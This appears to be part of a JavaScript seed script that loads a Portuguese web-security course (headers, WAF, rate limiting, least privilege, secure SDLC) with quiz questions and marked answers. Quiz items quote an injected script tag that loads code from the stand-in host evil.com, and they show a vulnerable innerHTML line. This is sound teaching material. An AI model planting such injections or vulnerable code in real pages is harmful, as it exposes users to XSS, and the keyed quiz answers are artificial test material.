                        "value": "[[\"Cabeçalho\",\"O que faz\",\"Ataque mitigado\"],[\"Content-Security-Policy\",\"Restringe as origens de scripts e recursos\",\"XSS (A05)\"],[\"Strict-Transport-Security\",\"Força o HTTPS no navegador\",\"Interceptação / downgrade (A04)\"],[\"X-Content-Type-Options: nosniff\",\"Impede a adivinhação de tipo MIME\",\"Execução de conteúdo disfarçado\"],[\"X-Frame-Options / frame-ancestors\",\"Bloqueia o enquadramento em iframe\",\"Clickjacking\"],[\"Cookie HttpOnly; Secure; SameSite\",\"Protege o cookie de sessão\",\"Roubo de sessão (A07) e CSRF\"]]"
                    }
                ],
                "questions": [
                    {
                        "statement": "Por que a validação feita apenas no navegador (cliente) não é suficiente para segurança?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "O atacante contorna o navegador e fala direto com a API, ignorando essa validação.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque a validação no navegador deixa o carregamento da página perceptivelmente mais lento.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o navegador só consegue validar campos numéricos, nunca campos de texto livre.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque validar dados no navegador consome cota de armazenamento do banco de dados.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Ao exibir na página um dado enviado pelo usuário, qual é a defesa definitiva contra XSS?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Aplicar output encoding, tratando o dado como texto simples no contexto certo.",
                                "isCorrect": true
                            },
                            {
                                "text": "Validar o tamanho máximo do campo diretamente no formulário do navegador.",
                                "isCorrect": false
                            },
                            {
                                "text": "Servir a página exclusivamente por HTTPS, nunca por uma conexão HTTP simples.",
                                "isCorrect": false
                            },
                            {
                                "text": "Minificar todo o código JavaScript antes de publicar a página em produção.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um trecho faz: el.innerHTML = \"Bem-vindo, \" + req.query.nome. Qual é a vulnerabilidade e a correção?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "É XSS refletido: um nome com HTML ou script é executado; a correção é usar textContent.",
                                "isCorrect": true
                            },
                            {
                                "text": "É SQL injection: a query final lê esse nome do banco; a correção é usar prepared statements.",
                                "isCorrect": false
                            },
                            {
                                "text": "É CSRF: falta um token contra falsificação de requisição; a correção é ativar o SameSite no cookie.",
                                "isCorrect": false
                            },
                            {
                                "text": "É IDOR: o usuário acessa dados de outra conta; a correção é checar o dono do recurso pedido.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um site define Content-Security-Policy: script-src 'self'. Mesmo assim um XSS injeta <script src=//evil.com>. O que acontece?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "O navegador bloqueia o carregamento desse script externo, pois a origem não está na política.",
                                "isCorrect": true
                            },
                            {
                                "text": "O script hospedado em evil.com roda normalmente, já que a CSP não afeta recursos externos.",
                                "isCorrect": false
                            },
                            {
                                "text": "A página inteira para de carregar e o servidor passa a responder com um erro 500.",
                                "isCorrect": false
                            },
                            {
                                "text": "A CSP transforma o script malicioso em texto simples e o exibe direto na tela do usuário.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um endpoint apenas remove a string \"<script>\" da entrada (blocklist) e considera isso suficiente contra XSS. Por que é frágil e qual a abordagem correta?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "É contornável com onerror ou encoding; o certo é encoding na saída e allowlist na entrada.",
                                "isCorrect": true
                            },
                            {
                                "text": "Não é frágil: remover a string <script> elimina por completo qualquer possibilidade de XSS.",
                                "isCorrect": false
                            },
                            {
                                "text": "A abordagem correta seria bloquear também a palavra SELECT, o que fecharia o XSS de vez.",
                                "isCorrect": false
                            },
                            {
                                "text": "Bastaria mover essa mesma remoção de <script> para acontecer do lado do navegador.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Defesas transversais II: WAF, rate limiting e menor privilégio",
                "blocks": [
                    {
                        "type": "text",
                        "value": "## Defesas transversais (II): WAF, limites e menor privilégio\n\nAs defesas anteriores viviam no código. Estas vivem em volta dele — nas camadas de rede, de infraestrutura e de arquitetura. Começamos pelo **WAF (Web Application Firewall)**: um filtro que inspeciona o tráfego HTTP e bloqueia padrões maliciosos conhecidos — assinaturas de SQL injection, XSS, path traversal.\n\nO WAF tem dois usos legítimos: ser uma **camada extra** na frente da aplicação e permitir o *virtual patching* — bloquear a exploração de uma falha recém-descoberta enquanto a correção de verdade não é publicada. Mas cuidado com a ilusão: o WAF é uma **rede de segurança, não um conserto**. Ele pode ser contornado (com encoding, técnicas novas, payloads inéditos) e **nunca** substitui código seguro, como prepared statements. Tratar o WAF como solução definitiva é um erro clássico."
                    },
                    {
                        "type": "quote",
                        "value": "WAF, rate limiting e menor privilégio não corrigem bugs — eles reduzem o dano quando (não *se*) um bug escapar. Defesa em profundidade é projetar assumindo que cada camada vai falhar algum dia."
                    },
                    {
                        "type": "text",
                        "value": "## Rate limiting: limitar é defender\n\nLimitar o número de requisições por IP, por usuário ou por rota é uma defesa transversal poderosa. Ela ataca de frente vários abusos:\n\n- **Força bruta e credential stuffing** (A07): sem um limite, o atacante testa milhões de senhas.\n- **Enumeração e varredura** (A01): dificultar a sondagem de IDs e recursos.\n- **Abuso de APIs caras e DoS de aplicação** (A10): impedir que poucas requisições esgotem os recursos do servidor.\n\nAplique especialmente em login, reset de senha, busca e APIs públicas. E combine técnicas: **backoff** progressivo, **CAPTCHA** após N falhas e bloqueio **por conta**, não só por IP — porque uma botnet distribui o ataque por milhares de endereços, e o limite por IP sozinho não segura. Bônus: cada bloqueio é um evento que alimenta o monitoramento de A09."
                    },
                    {
                        "type": "code",
                        "value": "// Limita o login a 5 tentativas por IP a cada 15 minutos\nimport rateLimit from \"express-rate-limit\";\n\nconst limiteLogin = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 5,\n  standardHeaders: true,\n  handler: (req, res) => {\n    logger.warn({ evento: \"rate_limit\", rota: \"login\", ip: req.ip });\n    res.status(429).send(\"Muitas tentativas. Tente mais tarde.\");\n  },\n});\n\napp.post(\"/login\", limiteLogin, loginHandler);"
                    },
                    {
                        "type": "text",
                        "value": "## Princípio do menor privilégio\n\nCada usuário, serviço ou componente deve ter **apenas** as permissões mínimas para a sua função — e nada além. É o princípio que transforma uma invasão num incidente **contido**, em vez de um desastre total: mesmo que o atacante entre, ele encontra portas trancadas. Onde ele aparece:\n\n- **Conta do banco da aplicação:** só `SELECT/INSERT/UPDATE` nas tabelas que usa, jamais privilégios de DBA. Assim, uma SQL injection (A05) que passe não consegue apagar tabelas nem ler dados fora do escopo.\n- **Tokens e chaves:** com escopo restrito e expiração curta (reforça A07 e A08).\n- **Processos e containers:** rodando como usuário sem privilégio, nunca como root (reforça A02).\n- **Usuários da aplicação:** com o menor papel possível e **negação por padrão** (reforça A01).\n\nMenor privilégio anda de mãos dadas com a **segregação de funções**: ninguém e nada acumula poder suficiente para causar estrago sozinho."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Defesa\",\"Reduz o risco de\",\"Não substitui\"],[\"WAF\",\"Injeção, XSS, path traversal (A05)\",\"Código seguro / prepared statements\"],[\"Rate limiting\",\"Força bruta e credential stuffing (A07); DoS (A10)\",\"Senhas fortes e MFA\"],[\"Menor privilégio (aplicação)\",\"Escalada de privilégio após a invasão (A01)\",\"Controle de acesso correto\"],[\"Menor privilégio (banco)\",\"O estrago de uma SQL injection (A05)\",\"Queries parametrizadas\"]]"
                    }
                ],
                "questions": [
                    {
                        "statement": "O que é um WAF e qual é a sua principal limitação?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "É um filtro que bloqueia tráfego malicioso conhecido, mas pode ser contornado.",
                                "isCorrect": true
                            },
                            {
                                "text": "É um antivírus instalado diretamente no computador de cada usuário final.",
                                "isCorrect": false
                            },
                            {
                                "text": "É um banco de dados especializado em guardar as senhas dos usuários já cifradas.",
                                "isCorrect": false
                            },
                            {
                                "text": "É uma ferramenta que corrige automaticamente todos os bugs de segurança do código.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Aplicar rate limiting no endpoint de login protege principalmente contra qual ataque?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Ataques de força bruta e credential stuffing contra as senhas dos usuários.",
                                "isCorrect": true
                            },
                            {
                                "text": "Ataques de cross-site scripting refletido nos campos do formulário de login.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ataques de clickjacking feitos com um iframe transparente sobre a tela de login.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ataques de injeção de SQL feitos diretamente pelo campo de senha do login.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "A aplicação conecta ao banco com um usuário que tem privilégios de administrador (pode DROP, GRANT). Um atacante encontra uma SQL injection. Como o menor privilégio teria limitado o dano?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Com uma conta restrita às tabelas necessárias, a injeção não conseguiria apagar nem ler tudo.",
                                "isCorrect": true
                            },
                            {
                                "text": "O menor privilégio evitaria que a própria falha de SQL injection existisse no código.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não mudaria nada: uma SQL injection sempre garante o controle total do servidor inteiro.",
                                "isCorrect": false
                            },
                            {
                                "text": "O menor privilégio vale só para pessoas; a conta usada pela aplicação fica sempre de fora.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um time descobre uma falha de injeção e decide: \"o WAF bloqueia esse ataque, então não precisamos corrigir o código\". Avalie a decisão.",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "É arriscada: o WAF é contornável e temporário, o código ainda precisa ser corrigido.",
                                "isCorrect": true
                            },
                            {
                                "text": "É correta: se o WAF já bloqueia o ataque, o problema está resolvido em definitivo.",
                                "isCorrect": false
                            },
                            {
                                "text": "É correta, mas só quando o WAF contratado é de um fornecedor pago e renomado.",
                                "isCorrect": false
                            },
                            {
                                "text": "É indiferente: usar o WAF ou corrigir o código dá exatamente no mesmo resultado.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O login sofre credential stuffing vindo de uma botnet com milhares de IPs diferentes; o rate limit por IP sozinho não segura. Qual combinação de defesas é a mais adequada?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Combinar limite por conta, MFA, CAPTCHA após falhas e alerta de monitoramento ativo.",
                                "isCorrect": true
                            },
                            {
                                "text": "Apenas aumentar bastante o limite de requisições permitidas para cada endereço IP.",
                                "isCorrect": false
                            },
                            {
                                "text": "Apenas instalar um WAF, já que ele resolve sozinho qualquer credential stuffing.",
                                "isCorrect": false
                            },
                            {
                                "text": "Apenas exigir uma senha com um caractere a mais no formulário de cadastro.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "O ciclo de desenvolvimento seguro (Secure SDLC)",
                "blocks": [
                    {
                        "type": "text",
                        "value": "## O ciclo de desenvolvimento seguro (Secure SDLC)\n\nTodas as defesas que vimos entram no código ou no runtime. Mas a segurança **mais barata** é a que entra **antes**: o princípio do *shift-left* (deslocar para a esquerda) move as práticas de segurança para o **início** do ciclo de desenvolvimento. A razão é econômica: corrigir uma falha de design custa uma fração do que custa corrigi-la depois de pronta em produção, com dados reais em risco.\n\nO **Secure SDLC** espalha a segurança por todas as fases, em vez de deixá-la para o fim:\n\n- **Requisitos e design:** *threat modeling* — pensar como as coisas podem dar errado antes de escrever código (é o coração de A06, Design Inseguro).\n- **Codificação:** padrões seguros, revisão de código e análise automática.\n- **Testes:** testes de segurança, não só funcionais.\n- **Deploy e operação:** configuração segura (A02) e monitoramento contínuo (A09).\n\nSegurança é um **processo**, não uma caixinha marcada na véspera do lançamento."
                    },
                    {
                        "type": "text",
                        "value": "## Revisão de código e as três siglas: SAST, DAST e SCA\n\nA revisão humana continua insubstituível para o que a máquina não vê: lógica de acesso furada, um segredo hardcoded, entrada não confiável usada sem cuidado. Um bom PR carrega um **checklist de segurança**. Ao lado dela, três famílias de ferramentas automatizam a caça a falhas — e se **complementam**:\n\n- **SAST (análise estática):** lê o **código-fonte parado**, sem executá-lo, procurando padrões perigosos (concatenação em SQL, uso de `innerHTML`, segredos commitados). Roda cedo, no PR/CI. Gera alguns falsos positivos.\n- **DAST (análise dinâmica):** testa a aplicação **rodando**, de fora, como um atacante. Encontra o que só aparece em runtime: cabeçalho de segurança ausente, erro de configuração, comportamento inesperado.\n- **SCA (análise de composição):** examina as **dependências de terceiros** contra bancos de vulnerabilidades conhecidas. É a defesa direta de A03 (cadeia de suprimentos) — pense em `npm audit` e no Dependabot.\n\nNenhuma sozinha basta: o SAST vê o código mas não o runtime; o DAST vê o runtime mas não o código; o SCA vê o que você nem escreveu. Juntas, cobrem os três ângulos."
                    },
                    {
                        "type": "code",
                        "value": "# .github/workflows/seguranca.yml (trecho)\njobs:\n  seguranca:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: npm audit --audit-level=high   # SCA: dependencias (A03)\n      - run: npx semgrep --config auto       # SAST: codigo-fonte\n      # O DAST roda contra o ambiente de staging apos o deploy.\n      # O build FALHA em achados de alta severidade: esse gate\n      # impede que a vulnerabilidade chegue a producao."
                    },
                    {
                        "type": "text",
                        "value": "## Segurança contínua e o mapa das defesas\n\nA segurança não termina no deploy. Uma dependência segura hoje vira vulnerável amanhã (A03), uma configuração muda e abre uma brecha (A02), e o monitoramento (A09) precisa vigiar produção o tempo todo. Por isso o ciclo é **contínuo**: testes de segurança a cada mudança, gestão de patches e pentests periódicos.\n\nE assim fechamos a trilha. Cada vulnerabilidade que você estudou tem uma ou mais defesas centrais — e você vai reparar que os mesmos nomes se repetem (validar no servidor, menor privilégio, encoding, monitorar). Não é coincidência: **poucos princípios, aplicados com disciplina, cobrem a maior parte do OWASP Top 10**. O mapa abaixo resume a trilha inteira."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Vulnerabilidade (OWASP Top 10 2025)\",\"Defesas centrais\"],[\"A01 Controle de acesso quebrado\",\"Negar por padrão, checar no servidor, menor privilégio\"],[\"A02 Configuração incorreta\",\"Hardening, remover padrões, cabeçalhos de segurança, DAST\"],[\"A03 Cadeia de suprimentos\",\"SCA, travar versões, verificar integridade\"],[\"A04 Falhas criptográficas\",\"TLS/HSTS, hashing forte de senha, não vazar dados em logs\"],[\"A05 Injeção (inclui XSS)\",\"Prepared statements, output encoding, CSP, WAF\"],[\"A06 Design inseguro\",\"Threat modeling, rate limiting, limites de negócio\"],[\"A07 Falhas de autenticação\",\"MFA, hashing de senha, rate limiting, cookies seguros\"],[\"A08 Integridade de software/dados\",\"Assinaturas, verificação de integridade, pipeline confiável\"],[\"A09 Logging e alerta\",\"Registrar os eventos certos, nunca segredos, alertar e reter\"],[\"A10 Condições excepcionais\",\"Falhar de forma segura, não vazar stack trace, registrar o erro\"]]"
                    },
                    {
                        "type": "quote",
                        "value": "Você começou esta trilha sabendo construir; termina sabendo construir com segurança — enxergando cada funcionalidade ao mesmo tempo como um atacante e como um defensor. Segurança não é um destino que se alcança, e sim uma prática que se renova a cada commit, a cada dependência atualizada e a cada log revisado."
                    }
                ],
                "questions": [
                    {
                        "statement": "O que significa \"shift-left\" em segurança de software?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Mover as práticas de segurança para o início do ciclo, no design e no código.",
                                "isCorrect": true
                            },
                            {
                                "text": "Deixar toda a segurança concentrada na última etapa, pouco antes do lançamento.",
                                "isCorrect": false
                            },
                            {
                                "text": "Terceirizar toda a segurança para uma empresa externa somente após o deploy.",
                                "isCorrect": false
                            },
                            {
                                "text": "Mover fisicamente os servidores para a esquerda do data center por resfriamento.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Para que serve a análise SCA (Software Composition Analysis) e qual categoria do OWASP ela cobre mais diretamente?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Analisa as dependências de terceiros contra vulnerabilidades já conhecidas; cobre a A03.",
                                "isCorrect": true
                            },
                            {
                                "text": "Analisa o código-fonte próprio em busca de bugs de lógica; cobre principalmente a A01.",
                                "isCorrect": false
                            },
                            {
                                "text": "Testa a aplicação já em execução, vista de fora como um atacante; cobre a A02.",
                                "isCorrect": false
                            },
                            {
                                "text": "Cifra os dados sensíveis armazenados em repouso no banco; cobre principalmente a A04.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma falha só aparece com a aplicação no ar: um cabeçalho de segurança está ausente na resposta HTTP. Qual tipo de ferramenta tende a detectá-la?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "O DAST, que testa a aplicação em execução, olhando de fora como um atacante.",
                                "isCorrect": true
                            },
                            {
                                "text": "O SAST, que lê o código-fonte parado, sem chegar a executar a aplicação.",
                                "isCorrect": false
                            },
                            {
                                "text": "O SCA, que analisa apenas as dependências de terceiros usadas pelo projeto.",
                                "isCorrect": false
                            },
                            {
                                "text": "Um linter comum, focado apenas no estilo e na formatação do código-fonte.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O pipeline de CI roda npm audit e um SAST, mas está configurado para nunca falhar o build, mesmo com achados críticos. Qual é o problema?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Sem um gate que barre achados críticos, falhas conhecidas seguem direto para produção.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum: só de rodar as ferramentas, o código já fica garantidamente seguro no final.",
                                "isCorrect": false
                            },
                            {
                                "text": "O problema é usar duas ferramentas juntas; o certo seria manter apenas uma delas.",
                                "isCorrect": false
                            },
                            {
                                "text": "O npm audit e o SAST tecnicamente não conseguem rodar dentro do mesmo pipeline.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma aplicação usa prepared statements, mas: roda o banco com usuário admin, não tem rate limit no login e registra o token de sessão nos logs (sem alerta). Um atacante rouba um token de um log exposto e faz credential stuffing. Que princípios foram violados?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Vários: menor privilégio no banco, ausência de rate limit e falha de logging em A09.",
                                "isCorrect": true
                            },
                            {
                                "text": "Apenas a criptografia falhou; os prepared statements já bastavam para garantir tudo.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nenhum princípio de fato falhou; o único erro foi não ter comprado um bom WAF.",
                                "isCorrect": false
                            },
                            {
                                "text": "Houve só uma falha de design; todas as outras camadas de defesa estavam corretas.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            }
        ]
    }
];

async function seed() {
    let [trilha] = await db.select().from(trails).where(eq(trails.name, NOME));
    if (!trilha) {
        [trilha] = await db
            .insert(trails)
            .values({ name: NOME, trailLevel: "intermediario", description: DESCRICAO })
            .returning();
        console.log("Trilha criada: " + trilha.name);
    }

    const existentes = await db.select().from(lessons).where(eq(lessons.trailId, trilha.id));
    if (existentes.length > 0) {
        console.log("Trilha " + NOME + " já tem " + existentes.length + " aulas. Nada a fazer.");
        return;
    }

    let totalAulas = 0;
    let totalQuestoes = 0;
    for (let mi = 0; mi < MODULOS.length; mi++) {
        const m = MODULOS[mi];
        const [mod] = await db
            .insert(modules)
            .values({ trailId: trilha.id, title: m.titulo, position: mi + 1 })
            .returning();
        for (let li = 0; li < m.aulas.length; li++) {
            const a = m.aulas[li];
            const [lesson] = await db
                .insert(lessons)
                .values({
                    trailId: trilha.id,
                    moduleId: mod.id,
                    title: a.titulo,
                    content: null,
                    contentBlocks: a.blocks,
                    position: li + 1,
                    published: true,
                })
                .returning();
            for (let qi = 0; qi < a.questions.length; qi++) {
                const q = a.questions[qi];
                const [questao] = await db
                    .insert(questions)
                    .values({
                        lessonId: lesson.id,
                        statement: q.statement,
                        difficulty: q.difficulty,
                        position: qi + 1,
                    })
                    .returning();
                await db.insert(questionOptions).values(
                    q.options.map((o, k) => ({
                        questionId: questao.id,
                        text: o.text,
                        isCorrect: o.isCorrect,
                        position: k + 1,
                    })),
                );
            }
            totalAulas++;
            totalQuestoes += a.questions.length;
        }
    }
    console.log("Seed concluído: " + MODULOS.length + " módulos, " + totalAulas + " aulas, " + totalQuestoes + " questões.");
}

seed()
    .then(() => process.exit(0))
    .catch((e) => {
        console.error("Falha no seed:", e);
        process.exit(1);
    });
